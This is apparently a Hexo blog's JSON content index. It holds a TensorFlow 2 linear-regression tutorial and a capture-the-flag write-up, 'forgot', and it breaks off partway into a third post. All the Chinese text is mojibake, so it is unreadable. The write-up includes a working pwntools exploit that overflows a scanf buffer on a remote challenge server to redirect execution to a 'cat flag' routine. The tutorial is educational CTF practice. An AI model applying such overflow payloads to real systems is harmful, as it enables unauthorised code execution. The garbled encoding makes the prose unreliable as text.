{"meta":{"title":"Mr.red","subtitle":"","description":"Things always start to get better after you give up","author":"Xiao Hong","url":"https://github.com/xiaohong404/xiaohong404.github.io","root":"/xiaohong404.github.io/"},"pages":[{"title":"about","date":"2020-10-15T04:55:40.000Z","updated":"2020-10-15T10:16:30.000Z","comments":true,"path":"about/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/about/index.html","excerpt":"","text":"å°çº¢ç«¥é‹ï¼Œè¯·å¤šæŒ‡æ•™ï¼"},{"title":"tags","date":"2020-10-15T04:55:36.000Z","updated":"2020-10-19T03:50:04.000Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-10-19T03:31:01.000Z","updated":"2020-10-19T03:50:34.000Z","comments":true,"path":"categories/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"TensorFlow2å®ç°çº¿æ€§å›å½’","slug":"TensorFlow2.0/TensorFlow2å®ç°çº¿æ€§å›å½’","date":"2020-10-27T10:00:13.000Z","updated":"2020-10-27T10:48:36.000Z","comments":true,"path":"2020/10/27/TensorFlow2.0/TensorFlow2å®ç°çº¿æ€§å›å½’/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/","excerpt":"","text":"çº¿æ€§å›å½’æ˜¯å…¥é—¨æœºå™¨å­¦ä¹ å¿…å­¦çš„ç®—æ³•ï¼Œå…¶ä¹Ÿæ˜¯æœ€åŸºç¡€çš„ç®—æ³•ä¹‹ä¸€ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ TensorFlow 2 æä¾›çš„ API å’Œ Eager Execution æœºåˆ¶å¯¹å…¶è¿›è¡Œå®ç°ã€‚ çº¿æ€§å›å½’æ˜¯ä¸€ç§è¾ƒä¸ºç®€å•ï¼Œä½†ååˆ†é‡è¦çš„æœºå™¨å­¦ä¹ æ–¹æ³•ï¼Œå®ƒä¹Ÿæ˜¯ç¥ç»ç½‘ç»œçš„åŸºç¡€ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œçº¿æ€§å›å½’è¦è§£å†³çš„é—®é¢˜å°±æ˜¯å¦‚ä½•æ‰¾åˆ°æœ€ç†æƒ³çš„ç›´çº¿å»æ‹Ÿåˆæ•£ç‚¹æ ·æœ¬ã€‚ å¯¹äºä¸€ä¸ªçº¿æ€§å›å½’é—®é¢˜ï¼Œä¸€èˆ¬æ¥è®²æœ‰ 2 ç§è§£å†³æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ï¼šæœ€å°äºŒä¹˜æ³•å’Œæ¢¯åº¦ä¸‹é™æ³•ã€‚å…¶ä¸­æœ€å°äºŒä¹˜æ³•åˆåˆ†ä¸ºä¸¤ç§æ±‚è§£æ€è·¯ï¼šä»£æ•°æ±‚è§£å’ŒçŸ©é˜µæ±‚è§£ã€‚æœ¬æ¬¡å®éªŒï¼Œå°†ä½¿ç”¨æ¢¯åº¦ä¸‹é™æ–¹æ³•æ¥è§£å†³çº¿æ€§å›å½’é—®é¢˜ã€‚åŒæ—¶ï¼Œå®éªŒå°†ä½¿ç”¨ TensorFlow ä½é˜¶ API å’Œé«˜é˜¶ API ä¸¤ç§æ–¹æ³•è¿›è¡Œå®ç°ã€‚ ä½é˜¶ API å®ç°TensorFlow çš„ä½é˜¶ API å®ç°ï¼Œå®é™…ä¸Šå°±æ˜¯åˆ©ç”¨æœ€åŸºæœ¬çš„å‡½æ•°å’Œç»„ä»¶ï¼Œç»“åˆ Eager Execution æœºåˆ¶æ¥å®Œæˆã€‚å®éªŒé¦–å…ˆåˆå§‹åŒ–ä¸€ç»„éšæœºæ•°æ®æ ·æœ¬ï¼Œå¹¶æ·»åŠ å™ªå£°ï¼Œç„¶åå°†å…¶å¯è§†åŒ–å‡ºæ¥ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å…¨éƒ¨ä½¿ç”¨ TensorFlow æä¾›çš„ API æ¥å®Œæˆï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨numpyæ•°ç»„ã€‚ 12345678910111213import matplotlib.pyplot as pltimport tensorflow as tfTRUE_W = 3.0TRUE_b = 2.0NUM_SAMPLES = 100# åˆå§‹åŒ–éšæœºæ•°æ®X = tf.random.normal(shape=[NUM_SAMPLES, 1]).numpy()noise = tf.random.normal(shape=[NUM_SAMPLES, 1]).numpy()y = X * TRUE_W + TRUE_b + noise # æ·»åŠ å™ªå£°plt.scatter(X, y) æ¥ä¸‹æ¥ï¼Œå®šä¹‰ä¸€å…ƒçº¿æ€§å›å½’æ¨¡å‹ï¼š $f(w, b, x) = w*x + b$ è¿™é‡Œæˆ‘ä»¬æ„å»ºè‡ªå®šä¹‰æ¨¡å‹ç±»ï¼Œå¹¶ä½¿ç”¨ TensorFlow æä¾›çš„ tf.Variable éšæœºåˆå§‹åŒ–å‚æ•° w å’Œæˆªè·é¡¹ bã€‚ 1234567class Model(object): def __init__(self): self.W = tf.Variable(tf.random.uniform([1])) # éšæœºåˆå§‹åŒ–å‚æ•° self.b = tf.Variable(tf.random.uniform([1])) def __call__(self, x): return self.W * x + self.b # w*x + b ä¸Šæ–¹å±•ç¤ºäº†ä¸€ä¸ªæ ‡å‡†çš„ TensorFlow æ¨¡å‹ç±»çš„æ„å»ºæ–¹æ³•ã€‚ å¯¹äºéšæœºåˆå§‹åŒ–çš„ w å’Œ bï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶æ‹Ÿåˆç›´çº¿ç»˜åˆ¶åˆ°æ ·æœ¬æ•£ç‚¹å›¾ä¸­ã€‚ 1234model = Model() # å®ä¾‹åŒ–æ¨¡å‹plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) æ­£å¸¸æƒ…å†µä¸‹ï¼Œåº”è¯¥ä¼šçœ‹åˆ°ç›´çº¿å¹¶æ²¡æœ‰å¾ˆå¥½åœ°æ‹Ÿåˆæ ·æœ¬ã€‚ç¤ºä¾‹æ•ˆæœå¦‚ä¸‹ï¼ˆä»…å‚è€ƒï¼‰ï¼š å½“ç„¶ï¼Œç”±äºæ˜¯éšæœºåˆå§‹åŒ–ï¼Œä¹Ÿæœ‰æå°æ¦‚ç‡ä¸€å¼€å§‹æ‹Ÿåˆæ•ˆæœéå¸¸å¥½ï¼Œé‚£ä¹ˆé‡æ–°æ‰§è¡Œä¸€æ¬¡ä¸Šé¢çš„å•å…ƒæ ¼å¦å¤–éšæœºåˆå§‹åŒ–ä¸€ç»„æ•°æ®å³å¯ã€‚å°½å¯èƒ½ä¿è¯ä¸€å¼€å§‹éšæœºåˆå§‹åŒ–çš„ç›´çº¿æ— æ³•å‡†ç¡®æ‹Ÿåˆæ•°æ®ï¼Œæ–¹ä¾¿åç»­ç›´è§‚æ„Ÿå—ä¼˜åŒ–è¿‡ç¨‹çš„æ•ˆæœã€‚ ç„¶åï¼Œå®šä¹‰çº¿æ€§å›å½’ä½¿ç”¨åˆ°çš„æŸå¤±å‡½æ•°ã€‚è¿™é‡Œä½¿ç”¨çº¿æ€§å›å½’é—®é¢˜ä¸­å¸¸ç”¨çš„å¹³æ–¹æŸå¤±å‡½æ•°ã€‚ ${\\rm Loss}(w, b, x, y) = \\sum_{i=1}^N (f(w, b, x_i) - y_i)^2$ å…¬å¼ä¸­ï¼Œf(w,b,$x_i$) æ˜¯æ¨¡å‹æ ¹æ® $x_i$ è®¡ç®—çš„é¢„æµ‹å€¼ï¼Œ*$y_i$* åˆ™è¡¨ç¤ºçœŸå®å€¼ã€‚ æ¥ä¸‹æ¥ï¼Œæ ¹æ®å…¬å¼å®ç°æŸå¤±è®¡ç®—å‡½æ•°ï¼ŒåŒæ ·ä½¿ç”¨ TensorFlow ä¸­çš„ç›¸å…³å‡½æ•°ã€‚ 123def loss_fn(model, x, y): y_ = model(x) return tf.reduce_mean(tf.square(y_ - y)) æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥å¼€å§‹è¿­ä»£è¿‡ç¨‹äº†ï¼Œè¿™ä¹Ÿæ˜¯æœ€å…³é”®çš„ä¸€æ­¥ã€‚ä½¿ç”¨æ¢¯åº¦ä¸‹é™æ³•æ±‚è§£çº¿æ€§å›å½’çš„é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦è®¡ç®—å‚æ•°çš„æ¢¯åº¦ï¼Œç„¶åä½¿ç”¨æ¢¯åº¦ä¸‹é™æ³•æ¥æ›´æ–°å‚æ•°ã€‚$$\\begin{align}w &amp;\\leftarrow w - lr * \\frac{\\partial {\\rm loss}(w, b)}{\\partial w} \\b &amp;\\leftarrow b - lr * \\frac{\\partial {\\rm loss}(w, b)}{\\partial b}\\end{align}$$å…¬å¼ä¸­ï¼Œlr æŒ‡ä»£å­¦ä¹ ç‡ã€‚ æ¢¯åº¦ä¸‹é™æ–¹æ³•æ˜¯æ•°å­¦ä¸­çš„ä¸€ç§æœ€ä¼˜åŒ–æ–¹æ³•ï¼Œå¸¸è¢«ç”¨äºç¥ç»ç½‘ç»œçš„è¿­ä»£ä¼˜åŒ–è¿‡ç¨‹ã€‚ç®€å•æ¦‚æ‹¬ï¼Œæ¢¯åº¦ä¸‹é™æ³•å°±æ˜¯æ²¿ç€æ¢¯åº¦ä¸‹é™æ–¹å‘å»å¯»æ‰¾æŸå¤±å‡½æ•°çš„æå°å€¼ï¼ˆæ¢¯åº¦çš„åæ–¹å‘ï¼‰ã€‚è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ TensorFlow 2 ä¸­çš„ Eager Execution æä¾›äº† tf.GradientTape ç”¨äºè¿½è¸ªæ¢¯åº¦ã€‚æ‰€ä»¥ï¼Œä¸‹é¢æˆ‘ä»¬å¯¹ç…§ç€å‚æ•°æ›´æ–°å…¬å¼æ¥å®ç°æ¢¯åº¦ä¸‹é™æ³•çš„è¿­ä»£æ›´æ–°è¿‡ç¨‹ã€‚ 1234567891011EPOCHS = 10 # å…¨éƒ¨æ•°æ®è¿­ä»£ 10 æ¬¡LEARNING_RATE = 0.1 # å­¦ä¹ ç‡for epoch in range(EPOCHS): # è¿­ä»£æ¬¡æ•° with tf.GradientTape() as tape: # è¿½è¸ªæ¢¯åº¦ loss = loss_fn(model, X, y) # è®¡ç®—æŸå¤± dW, db = tape.gradient(loss, [model.W, model.b]) # è®¡ç®—æ¢¯åº¦ model.W.assign_sub(LEARNING_RATE * dW) # æ›´æ–°æ¢¯åº¦ model.b.assign_sub(LEARNING_RATE * db) # è¾“å‡ºè®¡ç®—è¿‡ç¨‹ print(f&#x27;Epoch [&#123;epoch&#125;/&#123;EPOCHS&#125;], loss [&#123;loss&#125;], W/b [&#123;model.W.numpy()&#125;/&#123;model.b.numpy()&#125;]&#x27;) ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬åˆå§‹åŒ– tf.GradientTape() ä»¥è¿½è¸ªæ¢¯åº¦ï¼Œç„¶åä½¿ç”¨ tape.gradient æ–¹æ³•å°±å¯ä»¥è®¡ç®—æ¢¯åº¦äº†ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œtape.gradient() ç¬¬äºŒä¸ªå‚æ•°æ”¯æŒä»¥åˆ—è¡¨å½¢å¼ä¼ å…¥å¤šä¸ªå‚æ•°åŒæ—¶è®¡ç®—æ¢¯åº¦ã€‚ç´§æ¥ç€ï¼Œä½¿ç”¨ .assign_sub å³å¯å®Œæˆå…¬å¼ä¸­çš„å‡æ³•æ“ä½œç”¨ä»¥æ›´æ–°æ¢¯åº¦ã€‚ è¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ¢¯åº¦ä¸‹é™è¿‡ç¨‹,å¯ä»¥çœ‹åˆ°ï¼ŒæŸå¤±å‡½æ•°çš„å€¼éšç€è¿­ä»£è¿‡ç¨‹ä¸æ–­å‡å°ï¼Œæ„å‘³ç€æˆ‘ä»¬ç¦»æœ€ä¼˜åŒ–å‚æ•°ä¸æ–­æ¥è¿‘ã€‚ æœ€ç»ˆï¼Œæˆ‘ä»¬ç»˜åˆ¶å‚æ•°å­¦ä¹ å®Œæˆä¹‹åï¼Œæ¨¡å‹çš„æ‹Ÿåˆç»“æœã€‚ 12plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) â€‹ ç”±äºæ˜¯éšæœºåˆå§‹åŒ–å‚æ•°ï¼Œå¦‚æœè¿­ä»£åæ‹Ÿåˆæ•ˆæœä»ç„¶ä¸å¥½ï¼Œä¸€èˆ¬æ˜¯è¿­ä»£æ¬¡æ•°å¤ªå°‘çš„åŸå› ã€‚å¯ä»¥é‡å¤æ‰§è¡Œä¸Šé¢çš„è¿­ä»£å•å…ƒæ ¼å¤šæ¬¡ï¼Œå¢åŠ å‚æ•°æ›´æ–°è¿­ä»£æ¬¡æ•°ï¼Œå³å¯æ”¹å–„æ‹Ÿåˆæ•ˆæœã€‚ é«˜é˜¶ API å®ç°TensorFlow 2 ä¸­æä¾›äº†å¤§é‡çš„é«˜é˜¶ API å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿæ„å»ºæ‰€éœ€æ¨¡å‹ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€äº›æ–°çš„ API æ¥å®Œæˆçº¿æ€§å›å½’æ¨¡å‹çš„æ„å»ºã€‚è¿™é‡Œè¿˜æ˜¯æ²¿ç”¨ä¸Šé¢æä¾›çš„ç¤ºä¾‹æ•°æ®ã€‚ tf.keras æ¨¡å—ä¸‹æä¾›çš„ tf.keras.layers.Dense å…¨è¿æ¥å±‚ï¼ˆçº¿æ€§å±‚ï¼‰å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªçº¿æ€§è®¡ç®—è¿‡ç¨‹ã€‚æ‰€ä»¥ï¼Œæ¨¡å‹çš„å®šä¹‰éƒ¨åˆ†å°±å¯ä»¥ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªå…¨è¿æ¥å±‚å³å¯ã€‚ 12model = tf.keras.layers.Dense(units=1) # å®ä¾‹åŒ–çº¿æ€§å±‚model å…¶ä¸­ï¼Œunits ä¸ºè¾“å‡ºç©ºé—´ç»´åº¦ã€‚æ­¤æ—¶ï¼Œå‚æ•°å·²ç»è¢«åˆå§‹åŒ–äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»˜åˆ¶å‡ºæ‹Ÿåˆç›´çº¿ã€‚ 12plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) ä½ å¯ä»¥ä½¿ç”¨ model.variables æ‰“å°å‡ºæ¨¡å‹åˆå§‹åŒ–çš„éšæœºå‚æ•°ã€‚ 1model.variables æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥æ„å»ºæ¨¡å‹è¿­ä»£è¿‡ç¨‹äº†ã€‚ è¿™é‡ŒåŒæ ·ä½¿ç”¨ tf.GradientTape() æ¥è¿½è¸ªæ¢¯åº¦ï¼Œæˆ‘ä»¬ç®€åŒ–æŸå¤±è®¡ç®—å’Œæ›´æ–°çš„è¿‡ç¨‹ã€‚é¦–å…ˆï¼ŒæŸå¤±å‡½æ•°æ— éœ€å†è‡ªè¡Œæ„é€ ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ TensorFlow æä¾›çš„å¹³æ–¹æŸå¤±å‡½æ•° tf.keras.losses.mean_squared_error è®¡ç®—ï¼Œç„¶åä½¿ç”¨ tf.reduce_sum æ±‚å¾—å…¨éƒ¨æ ·æœ¬çš„å¹³å‡æŸå¤±ã€‚ 1234567891011EPOCHS = 10LEARNING_RATE = 0.002for epoch in range(EPOCHS): # è¿­ä»£æ¬¡æ•° with tf.GradientTape() as tape: # è¿½è¸ªæ¢¯åº¦ y_ = model(X) loss = tf.reduce_sum(tf.keras.losses.mean_squared_error(y, y_)) # è®¡ç®—æŸå¤± grads = tape.gradient(loss, model.variables) # è®¡ç®—æ¢¯åº¦ optimizer = tf.keras.optimizers.SGD(LEARNING_RATE) # éšæœºæ¢¯åº¦ä¸‹é™ optimizer.apply_gradients(zip(grads, model.variables)) # æ›´æ–°æ¢¯åº¦ print(f&#x27;Epoch [&#123;epoch&#125;/&#123;EPOCHS&#125;], loss [&#123;loss&#125;]&#x27;) å…¶æ¬¡ï¼Œä½¿ç”¨ model.variables å³å¯è¯»å–å¯å‚æ•°çš„åˆ—è¡¨ï¼Œæ— éœ€åƒä¸Šé¢é‚£æ ·æ‰‹åŠ¨ä¼ å…¥å‚æ•°ã€‚è¿™é‡Œä¸å†æŒ‰å…¬å¼æ‰‹åŠ¨æ›´æ–°æ¢¯åº¦ï¼Œè€Œæ˜¯ä½¿ç”¨ç°æœ‰çš„éšæœºæ¢¯åº¦ä¸‹é™å‡½æ•° tf.keras.optimizers.SGDï¼Œç„¶åä½¿ç”¨ apply_gradients å³å¯æ›´æ–°æ¢¯åº¦ã€‚ TensorFlow ä¸­æ²¡æœ‰æä¾›ä¸Šæ–¹æ‰‹åŠ¨å®ç°çš„æ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œåªæä¾›äº†éšæœºæ¢¯åº¦ä¸‹é™ç®—æ³•ã€‚ æœ€ç»ˆï¼ŒåŒæ ·å°†è¿­ä»£å®Œæˆçš„å‚æ•°ç»˜åˆ¶æ‹Ÿåˆç›´çº¿åˆ°åŸå›¾ä¸­ã€‚ 12plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåº”è¯¥èƒ½çœ‹åˆ°ä¸€ä¸ªæ›´å¥½çš„æ‹Ÿåˆç»“æœã€‚å½“ç„¶ï¼Œå¦‚æœæ‹Ÿåˆæ•ˆæœä¸å¥½ï¼Œå¯èƒ½æ˜¯è¿­ä»£æ‰¹æ¬¡å¤ªå°‘ï¼Œå¯ä»¥é‡å¤æ‰§è¡Œä¼˜åŒ–è¿‡ç¨‹ã€‚ Keras æ–¹å¼å®ç°é…åˆ TensorFlow æä¾›çš„é«˜é˜¶ APIï¼Œæˆ‘ä»¬çœå»äº†å®šä¹‰çº¿æ€§å‡½æ•°ï¼Œå®šä¹‰æŸå¤±å‡½æ•°ï¼Œä»¥åŠå®šä¹‰ä¼˜åŒ–ç®—æ³•ç­‰ 3 ä¸ªæ­¥éª¤ã€‚è‡³æ­¤ï¼Œä½ åº”è¯¥å¯ä»¥åˆæ­¥æ„Ÿå—åˆ° TensorFlow çš„æ˜“ç”¨æ€§å’Œå­˜åœ¨çš„å¿…è¦æ€§äº†ã€‚ä¸è¿‡ï¼Œä¸Šé¢çš„é«˜é˜¶ API å®ç°è¿‡ç¨‹å®é™…ä¸Šè¿˜ä¸å¤Ÿç²¾ç®€ï¼Œæˆ‘ä»¬å¯ä»¥å®Œå…¨ä½¿ç”¨ TensorFlow Keras API æ¥å®ç°çº¿æ€§å›å½’ã€‚ Keras æœ¬æ¥æ˜¯ä¸€ä¸ªç”¨ Python ç¼–å†™çš„ç‹¬ç«‹é«˜é˜¶ç¥ç»ç½‘ç»œ APIï¼Œå®ƒèƒ½å¤Ÿä»¥ TensorFlow, CNTKï¼Œæˆ–è€… Theano ä½œä¸ºåç«¯è¿è¡Œã€‚ç›®å‰ï¼ŒTensorFlow å·²ç»å¸çº³ Kerasï¼Œå¹¶ç»„æˆäº† tf.keras æ¨¡å—ã€‚å®˜æ–¹ä»‹ç»ï¼Œtf.keras å’Œå•ç‹¬å®‰è£…çš„ Keras ç•¥æœ‰ä¸åŒï¼Œä½†è€ƒè™‘åˆ°æœªæ¥çš„å‘å±•è¶‹åŠ¿ï¼Œå®éªŒä»¥å­¦ä¹  tf.keras ä¸ºä¸»ã€‚ æˆ‘ä»¬è¿™é‡Œä½¿ç”¨ Keras æä¾›çš„ Sequential é¡ºåºæ¨¡å‹ç»“æ„ã€‚å’Œä¸Šé¢çš„ä¾‹å­ç›¸ä¼¼ï¼Œå‘å…¶ä¸­æ·»åŠ ä¸€ä¸ªçº¿æ€§å±‚ã€‚ä¸åŒçš„åœ°æ–¹åœ¨äºï¼ŒKeras é¡ºåºæ¨¡å‹ç¬¬ä¸€å±‚ä¸ºçº¿æ€§å±‚æ—¶ï¼Œè§„å®šéœ€æŒ‡å®šè¾“å…¥ç»´åº¦ï¼Œè¿™é‡Œä¸º input_dim=1ã€‚ 123model = tf.keras.Sequential() # æ–°å»ºé¡ºåºæ¨¡å‹model.add(tf.keras.layers.Dense(units=1, input_dim=1)) # æ·»åŠ çº¿æ€§å±‚model.summary() # æŸ¥çœ‹æ¨¡å‹ç»“æ„ æ¥ä¸‹æ¥ï¼Œç›´æ¥ä½¿ç”¨ .compile ç¼–è¯‘æ¨¡å‹ï¼ŒæŒ‡å®šæŸå¤±å‡½æ•°ä¸º MSE å¹³æ–¹æŸå¤±å‡½æ•°ï¼Œä¼˜åŒ–å™¨é€‰æ‹© SGD éšæœºæ¢¯åº¦ä¸‹é™ã€‚ç„¶åï¼Œå°±å¯ä»¥ä½¿ç”¨ .fit ä¼ å…¥æ•°æ®å¼€å§‹è¿­ä»£äº†ã€‚ 12model.compile(optimizer=&#x27;sgd&#x27;, loss=&#x27;mse&#x27;) # å®šä¹‰æŸå¤±å‡½æ•°å’Œä¼˜åŒ–æ–¹æ³•model.fit(X, y, epochs=10, batch_size=32) # è®­ç»ƒæ¨¡å‹ batch_size æ˜¯é‡‡ç”¨å°æ‰¹æ¬¡è®­ç»ƒçš„å‚æ•°ï¼Œä¸»è¦ç”¨äºè§£å†³ä¸€æ¬¡æ€§ä¼ å…¥æ•°æ®è¿‡å¤šæ— æ³•è®­ç»ƒçš„é—®é¢˜ã€‚å½“ç„¶ï¼Œç”±äºç¤ºä¾‹æ•°æ®æœ¬èº«è¾ƒå°‘ï¼Œè¿™é‡Œæ„ä¹‰ä¸å¤§ï¼Œä½†è¿˜æ˜¯æŒ‰ç…§å¸¸è§„ä½¿ç”¨æ–¹æ³•è¿›è¡Œè®¾ç½®ã€‚ åŒæ ·ï¼Œç»˜åˆ¶æœ€ç»ˆçš„ç»“æœï¼š 12plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) ä¼šå‘ç°ï¼Œå®Œå…¨ä½¿ç”¨ Keras é«˜é˜¶ API å®é™…ä¸Šåªéœ€è¦ 4 è¡Œæ ¸å¿ƒä»£ç å³å¯å®Œæˆï¼Œç›¸æ¯”äºæœ€å¼€å§‹çš„ä½é˜¶ API ç®€åŒ–äº†å¾ˆå¤šã€‚ 1234model = tf.keras.Sequential() # æ–°å»ºé¡ºåºæ¨¡å‹model.add(tf.keras.layers.Dense(units=1, input_dim=1)) # æ·»åŠ çº¿æ€§å±‚model.compile(optimizer=&#x27;sgd&#x27;, loss=&#x27;mse&#x27;) # å®šä¹‰æŸå¤±å‡½æ•°å’Œä¼˜åŒ–æ–¹æ³•model.fit(X, y, epochs=10, batch_size=32) # è®­ç»ƒæ¨¡å‹","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"TensorFlow","slug":"Machine-Learning/TensorFlow","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/TensorFlow/"}],"tags":[{"name":"TensorFlow2.0","slug":"TensorFlow2-0","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/TensorFlow2-0/"}]},{"title":"forgot","slug":"AD_World/forgot","date":"2020-10-27T06:32:43.000Z","updated":"2020-10-27T08:04:40.000Z","comments":true,"path":"2020/10/27/AD_World/forgot/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/27/AD_World/forgot/","excerpt":"","text":"æ£€æŸ¥æ–‡ä»¶å¼€å¯çš„ä¿æŠ¤æªæ–½ ç”¨IDA32æ‰“å¼€ **__isoc99_scanf()**å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä¸ä¼šæ£€æŸ¥è¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨æ˜å†™å…¥åœ°å€ä¸ºv2çš„åœ°å€ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ä»v2åœ°å€å¼€å§‹å†™å…¥å†…å®¹è¦†ç›–æ§åˆ¶å‡½æ•°æ‰§è¡Œæµã€‚ shift+F12æŸ¥çœ‹å­—ç¬¦ä¸² æ‰¾åˆ°å…¶è°ƒç”¨å‡½æ•°çš„ä½ç½® æŸ¥çœ‹sub_80486CCå‡½æ•°æ‰€åœ¨åœ°å€ï¼ˆè¿™é‡Œå‡½æ•°åç§°å°±å¯¹åº”å…¶åœ°å€ï¼‰ å…¶å‡½æ•°æ‰€åœ¨åœ°å€0x080486CCï¼Œæ³¨æ„è¿™é‡Œè°ƒç”¨systemå‡½æ•°éœ€è¦ä¼ é€’cat flagå‚æ•°ï¼Œå¦‚æœè·³è½¬åœ°å€ç›´æ¥ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œåˆ™æ— æ³•ä¼ é€’ç›¸åº”çš„å‚æ•°ã€‚ åŸºæœ¬æ€è·¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œè¾“å…¥v2ï¼Œå°†v3-v12ä»»æ„ä¸€ä¸ªå‡½æ•°çš„åœ°å€ä¿®æ”¹ä¸ºsub_80486CCçš„åœ°å€ï¼Œä¹‹åè®©æ§åˆ¶å‡½æ•°æ‰§è¡Œè°ƒç”¨å³å¯ã€‚ v2æ˜¯ä¸€ä¸ª32å­—èŠ‚çš„charæ•°ç»„ï¼Œv2åŸºåœ°å€ä¸ºebp-0x74ï¼Œv3åŸºåœ°å€ä¸º0x54ï¼Œç›¸å·®0x74-0x54=0x20=32byteï¼Œæ­£å¥½æ˜¯32å­—èŠ‚çš„charæ•°ç»„çš„ç©ºé—´å¤§å°ã€‚å› æ­¤ï¼Œè¿™é‡Œé€‰æ‹©è¦†ç›–v3çš„åœ°å€ï¼ŒåŸå› åœ¨äºv3åœ¨æ ˆä¸­ç´§è´´å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´çš„å˜é‡ï¼Œå¯¹ç¨‹åºæµç¨‹é€ æˆçš„æœªçŸ¥å½±å“çš„å¯èƒ½æ€§æœ€å°ã€‚ä¹‹ååªéœ€è¦ä¿è¯å‡½æ•°ç»“å°¾è°ƒç”¨v3ï¼Œåˆ™éœ€è¦ä¿è¯- -v14ç­‰äº0ï¼Œå³è®©v14ç­‰äº1ã€‚ å³ä½¿å¾—sub_8048702åˆ¤æ–­æ¡ä»¶ä¸æˆç«‹ï¼Œç›´æ¥è·³å‡ºå¾ªç¯ï¼Œä½¿å¾—v14çš„å€¼ä¿æŒä¸å˜ï¼Œä»ä¸ºåˆšå¼€å§‹çš„1ã€‚æŸ¥çœ‹è¯¥å‡½æ•°æ‰§è¡Œçš„é€»è¾‘ã€‚ æŸ¥çœ‹å…¶ASCIIç å¯¹åº”çš„å­—ç¬¦ä¸ºï¼š è‹¥è¦ä½¿å¾—è¯¥å‡½æ•°çš„åˆ¤æ–­æ¡ä»¶ä¸æˆç«‹ï¼Œåˆ™ä¸èƒ½è¾“å…¥å­—ç¬¦â€˜aâ€™-â€˜zâ€™ï¼Œâ€™0â€˜-â€™9â€˜ï¼Œâ€™+â€˜ ï¼Œâ€™-â€˜ï¼Œâ€™_â€™ ç¼–å†™pythonè„šæœ¬12345678from pwn import *#context.log_level = &#x27;debug&#x27;io = remote(&#x27;220.249.52.133&#x27;,52435)io.sendlineafter(&#x27;&gt; &#x27;,&#x27;xiaohong&#x27;)cat_flag_addr = 0x80486CCpayload = &#x27;/&#x27;*(0x74-0x54)+ p32(cat_flag_addr)io.sendlineafter(&#x27;&gt; &#x27;,payload)io.interactive() PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"AD_World","slug":"PWN/AD-World","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/AD-World/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"},{"name":"Stack","slug":"Stack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Stack/"}]},{"title":"å¯¼æ•°è®¡ç®—å’Œè‡ªåŠ¨å¾®åˆ†å®ç°","slug":"TensorFlow2.0/å¯¼æ•°è®¡ç®—å’Œè‡ªåŠ¨å¾®åˆ†å®ç°","date":"2020-10-26T10:32:53.000Z","updated":"2020-10-26T10:46:52.000Z","comments":true,"path":"2020/10/26/TensorFlow2.0/å¯¼æ•°è®¡ç®—å’Œè‡ªåŠ¨å¾®åˆ†å®ç°/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"å¯¼æ•°è®¡ç®—Sigmoid å‡½æ•°æ˜¯æœºå™¨å­¦ä¹ 